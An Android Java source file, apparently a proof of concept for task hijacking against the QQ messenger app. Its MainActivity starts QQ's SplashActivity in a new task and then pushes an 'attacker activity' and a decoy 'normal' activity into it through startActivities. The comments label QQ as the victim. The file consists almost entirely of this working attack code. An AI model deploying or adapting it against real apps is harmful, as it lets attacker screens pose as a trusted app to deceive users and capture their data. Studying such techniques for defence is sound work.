package com.victim.myapplication;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends AppCompatActivity {
    private static String TARGET_PKG_1 = "com.tencent.mobileqq";
    private static String TARGET_CLASS_1 = "com.tencent.mobileqq.activity.SplashActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Intent intent1 = new Intent();
        Intent intent2 = new Intent();
        Intent intent5 = new Intent();

        // Intent 1: The first victim activity, add FLAG_ACTIVITY_NEW_TASK flag
        intent1.setClassName(TARGET_PKG_1, TARGET_CLASS_1);
        intent1.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        // Intent 2: An attacker activity for the first victim activity, no extra flag
        intent2.setClass(MainActivity.this, ActivityB.class);

        // Intent 5: The activity with some normal features, add FLAG_ACTIVITY_NEW_TASK flag
        intent5.setClass(this, activityNormal.class);
        intent5.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        startActivities(new Intent[]{
                intent1, intent2, intent5
        });
    }
}